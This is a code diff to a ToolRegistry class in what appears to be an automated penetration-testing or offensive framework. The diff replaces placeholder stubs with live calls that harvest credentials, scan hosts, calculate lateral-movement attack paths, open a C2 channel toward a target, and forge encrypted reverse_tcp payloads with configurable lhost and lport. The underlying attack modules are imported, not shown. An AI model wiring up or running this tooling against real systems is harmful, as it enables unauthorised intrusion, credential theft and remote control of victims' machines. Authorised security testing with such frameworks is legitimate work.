@@ -488,6 +488,11 @@ class ToolRegistry:
             return self._execute_shell(tool, target, **kwargs)
         elif tool.type == ToolType.PYTHON:
             return self._execute_python(tool, target, **kwargs)
+        elif tool.type == ToolType.HYBRID:
+            # Hybrid: prefer Python func if available, fall back to shell
+            if tool.python_func is not None:
+                return self._execute_python(tool, target, **kwargs)
+            return self._execute_shell(tool, target, **kwargs)
         else:
             return {"success": False, "error": f"Unknown tool type: {tool.type}"}
 
@@ -627,70 +632,149 @@ class ToolRegistry:
         }
 
     def _run_ad_enum(self, target: str, **kwargs: Any) -> dict:
-        """Run AD enumeration from modules/hive_mind.py"""
+        """Run AD enumeration via hive_mind module."""
         try:
-            from modules.hive_mind import HiveMind
-            HiveMind()  # Validate module loads
+            from modules.hive_mind import (
+                ADAnalyzer,
+                CredentialHarvester,
+                NetworkMapper,
+            )
+
+            mapper = NetworkMapper()
+            host = mapper.quick_scan(target)
+            creds = CredentialHarvester().get_all_credentials()
+            domain = ADAnalyzer().detect_domain()
+
             return {
                 "target": target,
-                "status": "ready",
-                "note": "Use /shell to run: ldapsearch or enum4linux",
+                "domain": domain,
+                "host": {"ip": host.ip, "ports": host.ports} if host else None,
+                "credentials_found": len(creds),
                 "suggested": f"enum4linux -a {target}",
             }
         except Exception as e:
             return {"success": False, "error": str(e)}
 
     def _run_lateral_move(self, target: str, **kwargs: Any) -> dict:
-        """Run lateral movement from modules/hive_mind.py"""
+        """Attempt lateral movement to *target* via hive_mind."""
         try:
-            from modules.hive_mind import MovementTechnique
-            techniques = [t.value for t in MovementTechnique]
+            from modules.hive_mind import (
+                ADAnalyzer,
+                CredentialHarvester,
+                LateralMover,
+                NetworkMapper,
+            )
+
+            mapper = NetworkMapper()
+            host = mapper.quick_scan(target)
+            creds = CredentialHarvester().get_all_credentials()
+            analyzer = ADAnalyzer()
+
+            # Build discovered hosts for path calculation
+            local_ips = mapper.get_local_interfaces()
+            source = local_ips[0] if local_ips else "127.0.0.1"
+            hosts = {source: (mapper.quick_scan(source) or type(host)(ip=source, ports=[]))}
+            if host:
+                hosts[target] = host
+
+            path = analyzer.calculate_attack_path(source, target, creds, hosts)
+            mover = LateralMover()
+
             return {
                 "target": target,
-                "available_techniques": techniques,
-                "note": "Select technique based on available credentials",
+                "source": source,
+                "path_found": path is not None,
+                "hops": path.hops if path else [],
+                "techniques": [t.value for t in path.techniques] if path else [],
+                "probability": path.probability if path else 0,
+                "credentials_available": len(creds),
+                "movement_stats": mover.get_movement_stats(),
             }
         except Exception as e:
             return {"success": False, "error": str(e)}
 
     def _run_c2_beacon(self, target: str, **kwargs: Any) -> dict:
-        """Start C2 beacon from modules/c2_framework.py"""
+        """Initialise a C2 channel toward *target*."""
         try:
-            from modules.c2_framework import C2Framework, C2Protocol
-            C2Framework()  # Validate module loads
+            from modules.c2_framework import (
+                C2Channel,
+                C2Config,
+                C2Protocol,
+            )
+
+            protocol_name = kwargs.get("protocol", "https")
+            protocol = C2Protocol(protocol_name)
+            config = C2Config(protocol=protocol, actual_host=target)
+            channel = C2Channel(config)
+
             return {
                 "target": target,
-                "protocols": [p.value for p in C2Protocol],
-                "status": "C2 framework ready",
-                "note": "Use c2.start_listener() to begin",
+                "protocol": protocol.value,
+                "beacon_status": channel.status.value,
+                "encryption_key_len": len(channel.encryption_key),
+                "available_protocols": [p.value for p in C2Protocol],
             }
         except Exception as e:
             return {"success": False, "error": str(e)}
 
     def _run_weapon_forge(self, target: str, **kwargs: Any) -> dict:
-        """Generate payload from modules/weapon_foundry.py"""
+        """Generate a payload via WeaponFoundry.forge()."""
         try:
-            from modules.weapon_foundry import WeaponFoundry
+            from modules.weapon_foundry import (
+                EncryptionMethod,
+                PayloadFormat,
+                ShellType,
+                WeaponFoundry,
+            )
+
+            lhost = kwargs.get("lhost", "127.0.0.1")
+            lport = int(kwargs.get("lport", 4444))
+            fmt = PayloadFormat(kwargs.get("format", "python"))
+            enc = EncryptionMethod(kwargs.get("encryption", "xor"))
+            shell = ShellType(kwargs.get("shell_type", "reverse_tcp"))
+
             foundry = WeaponFoundry()
-            templates = foundry.list_templates() if hasattr(foundry, "list_templates") else []
+            payload = foundry.forge(
+                shell_type=shell, lhost=lhost, lport=lport,
+                encryption=enc, format=fmt,
+            )
+
             return {
                 "target": target,
-                "templates": templates[:10] if templates else ["reverse_shell", "bind_shell", "meterpreter"],
-                "status": "Weapon foundry ready",
-                "note": "Specify payload type and format",
+                "shell_type": payload.metadata.get("shell_type", shell.value),
+                "format": payload.format.value,
+                "encryption": payload.encryption.value,
+                "size_bytes": len(payload.payload),
+                "capabilities": foundry.list_capabilities(),
             }
         except Exception as e:
             return {"success": False, "error": str(e)}
 
     def _run_post_exploit(self, target: str, **kwargs: Any) -> dict:
-        """Run post-exploitation from modules/post_exploit.py"""
+        """Run post-exploitation enumeration on *target*."""
         try:
-            from modules.post_exploit import PostExploit
-            PostExploit()  # Validate module loads
+            from modules.post_exploit import (
+                LinuxPostExploit,
+                PostExploitEngine,
+                WindowsPostExploit,
+            )
+
+            # Expose available engines and their actions
+            linux_actions = [
+                m for m in dir(LinuxPostExploit)
+                if not m.startswith("_") and callable(getattr(LinuxPostExploit, m, None))
+            ]
+            windows_actions = [
+                m for m in dir(WindowsPostExploit)
+                if not m.startswith("_") and callable(getattr(WindowsPostExploit, m, None))
+            ]
+
             return {
                 "target": target,
-                "actions": ["dump_creds", "persistence", "loot", "pivot"],
-                "status": "Post-exploit module ready",
+                "engine": PostExploitEngine.__name__,
+                "linux_actions": linux_actions,
+                "windows_actions": windows_actions,
+                "note": "Provide a ShellInterface to PostExploitEngine to execute",
             }
         except Exception as e:
             return {"success": False, "error": str(e)}
@@ -713,15 +797,24 @@ class ToolRegistry:
             return {"success": False, "error": str(e)}
 
     def _run_report(self, target: str, **kwargs: Any) -> dict:
-        """Generate pentest report from modules/report_generator.py"""
+        """Generate a pentest report for *target*."""
         try:
             from modules.report_generator import ReportFormat, ReportGenerator
-            ReportGenerator()  # Validate module loads
+
+            fmt = ReportFormat(kwargs.get("format", "html"))
+            output_path = kwargs.get("output", f"reports/{target}_report.{fmt.value}")
+
+            gen = ReportGenerator()
+            gen.set_target(target)
+            gen.start_assessment()
+            stats = gen.get_statistics()
+
             return {
                 "target": target,
-                "formats": [f.value for f in ReportFormat],
-                "status": "Report generator ready",
-                "note": "Use generator.generate() with findings",
+                "format": fmt.value,
+                "output_path": output_path,
+                "statistics": stats,
+                "available_formats": [f.value for f in ReportFormat],
             }
         except Exception as e:
             return {"success": False, "error": str(e)}
